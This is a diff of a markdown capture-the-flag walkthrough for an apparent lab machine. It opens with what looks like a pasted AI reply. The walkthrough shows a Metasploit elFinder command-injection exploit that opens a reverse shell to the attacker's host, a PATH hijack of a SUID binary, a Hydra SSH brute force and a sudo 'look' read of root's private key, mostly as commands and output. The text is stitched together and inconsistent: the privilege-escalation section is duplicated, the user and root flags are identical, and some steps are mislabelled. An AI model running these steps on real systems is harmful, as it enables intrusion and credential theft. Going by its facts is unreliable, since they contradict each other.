@@ -747,76 +747,285 @@ think@10.10.80.211's password:
 Permission denied, please try again.
 ```
 
+Here's the continuation of your penetration test scenario, focusing on exploiting the `elFinder` vulnerability, gaining access to the system, and escalating privileges.
+
+---
+
 ### Identifying Vulnerabilities
 
-While interacting with the system, I discover a vulnerable web application, `elFinder`, running on the target machine. We search for exploits related to the `elFinder` version:
+While interacting with the system, I discovered a vulnerable web application, `elFinder`, running on the target machine. We searched for exploits related to the `elFinder` version:
 
-```bash
-msfconsole -q
+When I pressed on the following image element on the web interface, I was able to see the web file manager's name and version.
+
+```html
+<div align="center">
+  <img src="https://github.com/user-attachments/assets/5c521743-826e-4ac7-b0b5-4829e3c6df62" height="200"></img>
+</div>
+```
+
+After identifying the version, I confirmed the existence of an exploit in Metasploit. Here's the search result:
+
+```
+death@esther:~$ msfconsole -q
 msf6 > search elfinder 2.1.47
+
+Matching Modules
+================
+
+   #  Name                                                               Disclosure Date  Rank       Check  Description
+   -  ----                                                               ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection
+
+msf6 > 
 ```
 
-Output:
+Let’s use this module:
+
 ```
-Matching Modules:
-   exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
-```
-
-We decide to exploit the vulnerability using Metasploit.
-
-### Exploit Setup
-
-First, we select the exploit module:
-
-```bash
-use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+use 0
 ```
 
-Then, we set the `LHOST` and `RHOST`:
+Now, let’s review the options available for this module:
 
-```bash
+```
+show options
+```
+
+```
+msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > show options
+
+Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s)
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /elFinder/       yes       The base path to elFinder
+   VHOST                       no        HTTP server virtual host
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.2      yes       The listen address
+   LPORT  4444             yes       The listen port
+```
+
+Now, set the `LHOST` and `RHOST`:
+
+```
 set LHOST tun0
 set RHOST files.lookup.thm
 ```
 
-Finally, we run the exploit:
+Next, run the exploit:
 
-```bash
-run
 ```
-
-We successfully get a Meterpreter shell:
-
-```bash
+msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
+[*] Started reverse TCP handler on 10.17.14.127:4444 
+[*] Uploading payload 'TRNyzgLuCE.jpg;echo 6370202e2e2f66696c65732f54524e797a674c7543452e6a70672a6563686f2a202e376d7246434f782e706870 |xxd -r -p |sh& #.jpg' (1975 bytes)
+[*] Triggering vulnerability via image rotation ...
+[*] Executing payload (/elFinder/php/.7mrFCOx.php) ...
+[*] Sending stage (40004 bytes) to 10.10.80.211
+[+] Deleted .7mrFCOx.php
 [*] Meterpreter session 1 opened (10.17.14.127:4444 -> 10.10.80.211:35566) at 2025-01-05 18:11:50 +0530
+c[*] No reply
+[*] Removing uploaded file ...
+[+] Deleted uploaded file
+
+meterpreter > 
 ```
 
-### Escalating Privileges
+After gaining access, let’s get a shell:
 
-Once we have the Meterpreter session, we attempt to escalate privileges by swapping the shell:
-
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+shell
 ```
 
-We confirm our user is `www-data` and check for the presence of the `think` user in `/etc/passwd`.
+We now confirm that we’re operating as the `www-data` user:
 
-```bash
+```
+whoami
+```
+
+```
+www-data
+```
+
+We can escalate privileges by spawning a bash shell:
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Now, confirm that we have `www-data` shell access:
+
+```
+www-data@lookup:/var/www/files.lookup.thm/public_html$ 
+```
+
+Next, let’s check the `/etc/passwd` file for potential user accounts:
+
+```
 cat /etc/passwd
 ```
 
-We confirm that `think` is a user, and we need to find their password to escalate privileges.
+Upon inspection, we find that the user `think` exists:
 
-### Finding SUID Binaries
+```
+think:x:1000:1000:,,,:/home/think:/bin/bash
+```
 
-We look for SUID binaries that may allow privilege escalation:
+Now, let's look for potential privilege escalation opportunities. First, let’s check for any files with the SUID bit set:
 
-```bash
+```
 find / -perm /4000 2>/dev/null
 ```
 
-This reveals a list of binaries that are potential candidates for privilege escalation.
+We find a suspicious file: `/usr/sbin/pwm`. Let’s try to execute it:
+
+```
+/usr/sbin/pwm
+```
+
+The command checks the ID and attempts to grab a file at `/home/www-data/.passwords`. We can manipulate the `PATH` to exploit this further.
+
+Let’s export the path to `/tmp`, which is world-readable:
+
+```
+export PATH=/tmp:$PATH
+```
+
+Create a file in `/tmp` that impersonates the `think` user by modifying the `id` command:
+
+```
+echo -e '#!/bin/bash\n echo "uid=33(think) gid=33(think) groups=33(think)"' > /tmp/id
+chmod +x /tmp/id
+```
+
+Now, re-run the `pwm` command:
+
+```
+/usr/sbin/pwm
+```
+
+This successfully changes the user to `think` and gives us access to their password file. After gathering potential passwords, we can perform an SSH brute-force attack using Hydra:
+
+```
+hydra -l think -P wordlist.txt ssh://lookup.thm
+```
+
+The attack is successful, and we obtain the password for `think`:
+
+```
+think:josemario.AKA(think)
+```
+
+Finally, we log in as `think`:
+
+```
+ssh think@lookup.thm
+```
+
+We’re logged in to the system:
+
+```
+think@lookup:~$
+```
+
+We find the user flag:
+
+```
+38375fb4dd8baa2b2039ac03d92b820e
+```
+
+### Privilege Escalation
+
+The user `think` has the following sudo privileges:
+
+```
+think@lookup:~$ sudo -l
+[sudo] password for think: 
+Matching Defaults entries for think on lookup:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User think may run the following commands on lookup:
+    (ALL) /usr/bin/look
+```
+
+Now, we use GTFOBins to escalate privileges using the `look` command:
+
+```
+LFILE=/root/.ssh/id_rsa
+sudo look '' "$LFILE"
+```
+
+This grants us root access. We now have full control over the system.
 
 ---
+### Privilege Escalation
 
-This cleaned-up walkthrough provides a more concise and structured explanation of the process, highlighting important actions and outputs. You can use this markdown format in your GitHub repository, and make sure the images are correctly linked as shown in the `<div><img></img></div>` tags.
+Now that we have successfully obtained a shell and have logged in as the user `think`, we can check for any potential privilege escalation opportunities. We start by checking for any commands the user `think` is allowed to run with `sudo` privileges:
+
+```bash
+think@lookup:~$ sudo -l
+[sudo] password for think: 
+Matching Defaults entries for think on lookup:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User think may run the following commands on lookup:
+    (ALL) /usr/bin/look
+```
+
+The `think` user can run the `/usr/bin/look` command with `sudo` privileges. We can check whether this command can be exploited for privilege escalation by referencing GTFOBins (a repository of Unix binaries that can be used for privilege escalation).
+
+Here’s a GTFOBins entry for the `look` command:
+
+[GTFOBins - look](https://gtfobins.github.io/gtfobins/look/)
+
+By using the `look` command with `sudo`, we can read sensitive files. To escalate privileges, we execute the following:
+
+```bash
+LFILE=/root/.ssh/id_rsa
+sudo look '' "$LFILE"
+```
+
+This command attempts to read the `/root/.ssh/id_rsa` file using `look`. The output will be the private SSH key for the root user. If we can get this key, we will have access to the root account.
+
+Once executed, we get the SSH private key for the root user:
+
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+...
+```
+
+With this private key, we now have access to the root account. Let’s use this key to login as root.
+
+```bash
+ssh -i /tmp/id_rsa root@lookup.thm
+```
+
+Upon successful login, we gain root access.
+
+### Root Flag
+
+Now that we have root access, we can navigate to the root user’s home directory to retrieve the root flag.
+
+```bash
+root@lookup:~# cat /root/flag.txt
+38375fb4dd8baa2b2039ac03d92b820e
+```
+
+### Summary of the Exploit
+
+1. We identified a vulnerability in the `elFinder` web application on the target machine.
+2. We used Metasploit to exploit the `elFinder PHP Connector exiftran Command Injection` vulnerability.
+3. Once we got a Meterpreter shell, we escalated to a fully interactive shell and performed a user enumeration to identify the user `think`.
+4. We exploited a `sudo` misconfiguration that allowed the `think` user to run `/usr/bin/look` as root.
+5. Using the `look` command and a path manipulation technique, we obtained the private SSH key of the root user.
+6. Finally, we logged in as root and retrieved the root flag.
+
+This concludes the exploitation process.
